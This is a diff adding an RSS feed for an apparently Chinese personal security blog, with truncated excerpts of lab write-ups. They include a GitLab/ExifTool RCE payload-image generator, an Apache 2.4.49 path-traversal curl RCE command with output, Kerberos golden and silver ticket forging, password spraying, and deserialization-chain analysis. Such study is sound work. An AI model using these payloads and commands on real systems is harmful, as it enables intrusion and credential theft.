@@ -1,0 +1,169 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Tigger on Tigger的个人博客</title>
+    <link>/authors/tigger/</link>
+    <description>Recent content in Tigger on Tigger的个人博客</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <copyright>&amp;copy; 2021 &lt;a href=&#34;http://www.cnaloha.com/&#34;&gt;Tigger&lt;/a&gt;
+</copyright>
+    <lastBuildDate>Sun, 17 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="/authors/tigger/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>CVE-2021-22205 复现</title>
+      <link>/posts/22205/</link>
+      <pubDate>Sun, 17 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/22205/</guid>
+      <description>CVE-2021-22205 是GitLab在4月份爆出的RCE，实际上是依托于CVE-2021-22204，也就是ExifTool的命令执行。而GitLab刚好上次hw的时候碰到过，虽然当时的对方gitlab版本比较高没有利用成功，但当时看的时候比较有意思，这里重新复现一下。
+一、漏洞原理 Gitlab 是使用Ruby与Go编写的git软件，而CVE-2021-22205的漏洞原理可以参见
+https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html
+https://hackerone.com/reports/1154542
+简单说明：
+ 当上传图片文件时，Gitlab Workhorse将扩展名为jpg|jpeg|tiff的文件通过ExifTool删除任何非白名单标记。 ExifTool，它是一个使用perl编写的用于解析、操作图片文件中Tags信息的工具。tags就是时间、日期、地理位置等存在于图片格式中的信息。https://segmentfault.com/a/1190000018032048 而Gitlab 利用ExifTool来删除图片的tags信息。 但是ExifTool在处理DjVu模块的时候，可以使用构造的数据绕过正则过滤，导致perl命令执行。  二、复现 这里使用vulfocus靶场，注意在启动靶场后由于比较慢，所以需要过几分钟才不会出现拒绝访问和502。
+进去之后修改密码，使用root账户登录。找到上传点：
+使用原作者的echo_vakzz.jpg完成漏洞验证：
+修改执行的命令：
+三、命令执行图片构造： 利用原JPG构造符合格式的命令执行的图片即可：
+EXP和POC在github上有许多，这里就不重复造轮子了，简单写一个自己的用来生成执行命令的图片的python脚本：
+import base64 import sys def getPayload(command): payload = b&#39;&#39; payload += b&#39;\x41\x54\x26\x54\x46\x4F\x52\x4D\x00\x00\x03\xAF\x44\x4A&#39; payload += b&#39;\x56\x4D\x44\x49\x52\x4D\x00\x00\x00\x2E\x81\x00\x02\x00&#39; payload += b&#39;\x00\x00\x46\x00\x00\x00\xAC\xFF\xFF\xDE\xBF\x99\x20\x21&#39; payload += b&#39;\xC8\x91\x4E\xEB\x0C\x07\x1F\xD2\xDA\x88\xE8\x6B\xE6\x44&#39; payload += b&#39;\x0F\x2C\x71\x02\xEE\x49\xD3\x6E\x95\xBD\xA2\xC3\x22\x3F&#39; payload += b&#39;\x46\x4F\x52\x4D\x00\x00\x00\x5E\x44\x4A\x56\x55\x49\x4E&#39; payload += b&#39;\x46\x4F\x00\x00\x00\x0A\x00\x08\x00\x08\x18\x00\x64\x00&#39; payload += b&#39;\x16\x00\x49\x4E\x43\x4C\x00\x00\x00\x0F\x73\x68\x61\x72&#39; payload += b&#39;\x65\x64\x5F\x61\x6E\x6E\x6F\x2E\x69\x66\x66\x00\x42\x47&#39; payload += b&#39;\x34\x34\x00\x00\x00\x11\x00\x4A\x01\x02\x00\x08\x00\x08&#39; payload += b&#39;\x8A\xE6\xE1\xB1\x37\xD9\x7F\x2A\x89\x00\x42\x47\x34\x34&#39; payload += b&#39;\x00\x00\x00\x04\x01\x0F\xF9\x9F\x42\x47\x34\x34\x00\x00&#39; payload += b&#39;\x00\x02\x02\x0A\x46\x4F\x52\x4D\x00\x00\x03\x07\x44\x4A&#39; payload += b&#39;\x56\x49\x41\x4E\x54\x61\x00\x00\x01\x50\x28\x6D\x65\x74&#39; payload += b&#39;\x61\x64\x61\x74\x61\x0A\x09\x28\x43\x6F\x70\x79\x72\x69&#39; payload += b&#39;\x67\x68\x74\x20\x22\x5C\x0A\x22\x20\x2E\x20\x71\x78\x7B&#39; payload += b&#39;echo\x20&#39;+base64.</description>
+    </item>
+    
+    <item>
+      <title>CC1利用链分析</title>
+      <link>/posts/transformedmap%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</link>
+      <pubDate>Sat, 16 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/transformedmap%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</guid>
+      <description>Apache Commons是Apache开源的Java通用类项目在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做Apache Commons Collections，主要封装了Java的Collection(集合)相关类对象。
+在该组件中有一个Transformer接口，实现了该接口的类有 ConstantTransformer、invokerTransformer、ChainedTransformer、TransformedMap等等
+一、复现环境 环境：
+maven依赖
+&amp;lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;commons-collections&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;commons-collections&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;3.1&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt;  二、分析 ConstantTransformer类 该类是对Transformer类的实现。
+可以看到该类重写了transform方法，并且调用了Closure.execute方法，并且返回一个对象。
+简单来说，如果实例化ConstantTransformer对象的时候传入的是A类实例，那么我们调用该对象的transform对象的时候就会返回A类的实例。
+也就是它的作用是对对象进行了输入输出的转化。
+public class ClosureTransformer implements Transformer, Serializable { private static final long serialVersionUID = 478466901448617286L; private final Closure iClosure; public static Transformer getInstance(Closure closure) { if (closure == null) { throw new IllegalArgumentException(&amp;quot;Closure must not be null&amp;quot;); } else { return new ClosureTransformer(closure); } } public ClosureTransformer(Closure closure) { this.iClosure = closure; } public Object transform(Object input) { this.</description>
+    </item>
+    
+    <item>
+      <title>JAVA安全基础之动态代理</title>
+      <link>/posts/j1/</link>
+      <pubDate>Thu, 14 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/j1/</guid>
+      <description>代理对象，是我们为了在原有对象的基础上实现功能的增强、修改等而为原有对象新建立的对象，比如，我们有一个对象A，现在我们试图在对象A进行操作之前添加时间记录，那么我们就可以给对象A创建一个代理对象Aplus，它的方法调用和A没有任何区别，只是会输出时间记录。那么实现了时间记录的对象Aplus就是代理对象，原对象A就是目标对象。
+一、静态代理 想要实现一个简单的代理，我们最直观的想法是直接为目标类建立一个代理类，它接受一个目标类对象，并且可以实现增强操作。
+比如：
+但是这样很显然有一个问题，那就是有多少个目标类就需要创建多少个对应的代理类，并且要实现同样的接口，非常不方便。
+二、动态代理 如果抛开实现细节，简单地来说的话，动态代理实现了根据目标对象接口来新建对象，并且可以将新建对象与（代理对象）与目标联系起来。
+JDK提供了java.lang.reflect.InvocationHandler接口和 java.lang.reflect.Proxy类配合完成动态代理功能。
+我们知道，接口是无法新建对象的（它没有构造方法），所以我们需要使用java.lang.reflect.Proxy类得到代理对象：
+Proxy有个静态方法：getProxyClass(ClassLoader, interfaces)，只要你给它传入类加载器和一组接口，它就给你返回代理Class对象。
+由此该Class对象是从接口对象实现的，作为接口无法新建实例的替代。
+所以Proxy.getProxyClass()这个方法的本质就是：以Class造Class。
+在造出原有接口的构造方法以实现了可以新接口对象之后，还要考虑新的对象如何去实现方法的调用，这里的调用肯定是对目标对象的方法调用，所以有了InvocationHandler类，它可以通过反射去调用方法。
+在$Proxy0 类中，是存在一个字段handler的，它就是InvocationHandler对象，每一次对
+$Proxy0对象（也就是代理对象）调用某个方法的时候，它就会被导向handler.invoke方法。
+以下是一个demo，实现了一个简单的动态代理：
+package org.example; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.lang.reflect.Proxy; import java.rmi.Naming; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.UnicastRemoteObject; import java.lang.reflect.InvocationHandler; /** * Hello world! * */ //interface RMIServerTest extends Remote {String Pring() throws RemoteException; } //class RMIServerTestServer implements RMIServerTest { // @Override // public String Pring() throws RemoteException { // System.out.println(&amp;quot;hello&amp;quot;); // return &amp;quot;this is a test&amp;quot;; // } //} public class App { public static void main( String[] args ) throws Exception { //参数1是随意的类加载器，参数2是代理对象的接口。hellProxyClazz 是org.</description>
+    </item>
+    
+    <item>
+      <title>Pocsuite3 POC/EXP编写</title>
+      <link>/posts/pocsuite3-%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Apoc%E7%BC%96%E5%86%99/</link>
+      <pubDate>Mon, 11 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/pocsuite3-%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Apoc%E7%BC%96%E5%86%99/</guid>
+      <description>Pocsuite3 是一个POC框架，用于漏洞的验证、攻击等等
+使用 https://github.com/knownsec/pocsuite3/blob/master/docs/USAGE.md
+Pocsuite3可以进行批量验证、攻击，它有三种模式verify（验证）、attack（攻击）、shell（获得shell），并且可以设置多种参数。
+编写POC 这里以CVE-2021-41773、CVE-2021-42013为例尝试使用Pocsuite3编写PoC与EXP：
+思路：
+分为linux与windows：
+ linux  发送post包检测是否可以RCE
+如果不可以的话发送get包检测是否可以目录穿越
+读取对象:/etc/passwd
+关键字：root
+ windows  由于windows的apache无法直接调用cmd执行命令，只能通过php.exe之类的来解析，所以不考虑RCE，只判断是否可以目录穿越读取文件。
+读取对象：c:/Windows/win.ini
+关键字：extensions
+由于两个RCE仅仅是URL编码的不同，所以这里直接使用二次URL编码来兼容两个RCE。
+ 注意：python的request请求包会自动进行一次编码，所以编写poc的时候不需要二次编码
+使用%2e即可
+实验发现不行，它会在编码之前先解码一次，解码之后会将..删除，所以换了urllib库。
+ 导入包 编写 PoC 实现类 DemoPOC，继承自 PoCBase 类
+from pocsuite3.api import Output, POCBase, register_poc, requests, logger from pocsuite3.api import get_listener_ip, get_listener_port from pocsuite3.api import REVERSE_PAYLOAD from pocsuite3.lib.utils import random_str class DemoPOC(POCBase): ...  PoC信息字段填写 vulID = &#39;0&#39; # ssvid ID 如果是提交漏洞的同时提交 PoC，则写成 0 version = &#39;1.0&#39; # 默认为1 author = &#39;Oulaa&#39; # PoC 作者的大名 vulDate = &#39;2021-10-5&#39; # 漏洞公开的时间，不知道就写今天 createDate = &#39;2021-10-5&#39; # 编写 PoC 的日期 updateDate = &#39;2021-10-5&#39; # PoC 更新的时间，默认和编写时间一样 references = [] # 漏洞地址来源，0day 不用写 name = &#39;CVE-2021-41773/CVE-2021-42013 Apache HTTPd (2.</description>
+    </item>
+    
+    <item>
+      <title>域中票据的制作</title>
+      <link>/posts/%E5%9F%9F%E4%B8%AD%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%88%B6%E4%BD%9C/</link>
+      <pubDate>Mon, 11 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/%E5%9F%9F%E4%B8%AD%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%88%B6%E4%BD%9C/</guid>
+      <description>一、使用mimikatz制作票据 kerberos::purge  kerberos::golden /user:administrator /domain:unicode.org /sid:S-1-5-21-165017151-3123059220-25911706310 /krbtgt:xxx /ticket:admin.tck /ptt  注入票据
+kerberos::tgt admin.tck   注意：拿到票据之后注入内存，使用sc之类的服务的情况下使用主机名即可走域认证，使用IP走ntlm认证。
+ 清除票据
+klist /purge  二、impakect  （1）金票  制作票据：
+python3 ticketer.py -nthash 1caee7a5d22ec1b4a20d1c6d72cdfbf1 -domain-sid S-1-5-21-3428754558-1783579842-1599308265 -domain central.com.br administrator   -nthash为krbgtg的hash。
+-domain-sid为域SID，即域用户ID减去用户部分。
+ 设置临时环境变量(windows)：
+set KRB5CCNAME=C:\Users\aa\Desktop\剑客\内网渗透\impacket-master\impacket-master\examples  linux:
+export KRB5CCNAME=/pentest/impacket/examples/administrator.ccache  使用黄金票据去访问DC
+python3 wmiexec.py -k -no-pass -dc-ip 192.168.100.242 -debug SV-ERP0001   -dc-ip 为域控的用户名，目标必须是机器名，如果是本地需要配置host。
+  （2）银票  制作银票
+   python ticketer.py -nthash 305914b9bdab214a3cf72a238e8d0463 -domain-sid S-1-5-21-3428754558-1783579842-1599308265 -domain central.</description>
+    </item>
+    
+    <item>
+      <title>CVE-2021-41773 Apache HTTPd (2.4.49)</title>
+      <link>/posts/41773/</link>
+      <pubDate>Sun, 10 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/41773/</guid>
+      <description>一、 复现环境 https://github.com/blasty/CVE-2021-41773
+docker-compose build &amp;amp;&amp;amp; docker-compose up -d  二、目录穿越  不能在浏览器复现，会被自动去掉..
+ 三、RCE 前提：
+安装Apache之后，默认并不包含cgi 模块，需要我们自行安装以完成cgi解析，那么有没有可能在启用mod_cgi模块的前提下，实现RCE呢？
+所以前提是启用mod_cgid和mod_cgi模块。
+Linux上的apache实现回显RCE： 在linux上直接可以：
+curl -s --path-as-is -d &#39;echo Content-Type: text/plain; echo; id&#39; &amp;quot;http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh&amp;quot; uid=33(www-data) gid=33(www-data) groups=33(www-data)  使用burp：
+echo Content-Type: text/plain;echo;id  原理：
+直接执行命令无回显的且报500：
+原因是ap_scan_script_header_err_core_ex函数主要负责从cgi处理结果中读取输入，并确保输出格式符合一定要求。大体来说就是解析后的结果必须符合http协议规范，我们知道http请求分为header和body，且中间需要使用\r\n进行分割。
+也就是说，apache将cgi解析结果作为了http响应包的一部分。
+所以才有了如上构造的payload。
+windows上的RCE Windows版本的Apache通过目录穿越来读取cmd.exe，会提示mallformed header from script，无法实现命令执行。
+但是利用相应的cgi模块可以实现代码执行。
+参考资料 https://mp.weixin.qq.com/s/mx7_wTnU7IWxzeG7e6faTQ
+https://mp.weixin.qq.com/s?__biz=Mzg3MTU0MjkwNw==&amp;amp;mid=2247484889&amp;amp;idx=1&amp;amp;sn=3b3312b592554caa51e1cfcbacd832f0&amp;amp;chksm=cefdbccdf98a35dbf3ab94bb4fa60b63f6e6afd92224744cd496cd59658bee29e6e89cc801de&amp;amp;token=495462423&amp;amp;lang=zh_CN&amp;amp;scene=21#wechat_redirect</description>
+    </item>
+    
+    <item>
+      <title>Kerbrute域内用户枚举与密码喷洒</title>
+      <link>/posts/kerbrute%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E4%B8%8E%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/</link>
+      <pubDate>Sun, 10 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/kerbrute%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E4%B8%8E%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/</guid>
+      <description>根据 &amp;ldquo;kerberos篇&amp;rdquo;的第一步AS_REQ，其发送了用户名，在第二步的校验包AS_REP中由于用户存在、用户不存在与密码错误返回的包不一样，所以可以用来枚举用户名。
+ 用户名不存在：error-code: eRR-C-PRINCIPAL-UNKNOWN (6)
+密码错误：error-code: eRR-PREAUTH-REQUIRED (25) KDC_ERR_PREAUTH_FAILED(24) udp/tcp
+ 工具：
+https://github.com/3gstudent/pyKerbrute
+https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87Kerberos-pre-auth%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%92%8C%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4
+1. 用户名枚举： EnumADUser.py &amp;lt;domainControlerAddr&amp;gt; &amp;lt;domainName&amp;gt; &amp;lt;mode&amp;gt; &amp;lt;mode&amp;gt;: tcp or udp Eg. EnumADUser.py 192.168.1.1 test.com user.txt tcp  2. 密码喷洒 由于域内策略，连续密码猜测会导致帐户被锁定，爆破的时候一般采用喷洒式的攻击，即密码一样，跑不同的用户名。 关于口令次数限制，默认为 5 次，具体设置在
+\\&amp;lt;DOMAIN&amp;gt;\SYSVOL\&amp;lt;DOMAIN&amp;gt;\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf中
+（1）DomainPasswordSpray  用 PowerShell 编写的工具，用于对域用户执行密码喷洒攻击。默认情况下，它将利用 LDAP 从域中导出用户列表，然后扣掉被锁定的用户，再用固定密码进行密码喷洒。
+  缺点是不能在域外使用。
+ https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1
+（2）DomainPasswordSprayOutsideTheDomain https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-DomainPasswordSprayOutsideTheDomain.ps1
+可在域外使用
+3.SPN爆破
+KRB_AS_REP Roasting
+(知道即可) 对于域用户，如果设置了选项 &amp;ldquo;Do not require Kerberos preauthentication&amp;rdquo;，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP内容(enc-part底下的ciper，因为这部分是使用用户hash加密session-key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令
+使用 impacket 中的 GetNPUsers.py 直接获取即可 ，默认导出 hashcat 的格式，配合 hashcat 爆破即可</description>
+    </item>
+    
+  </channel>
+</rss>
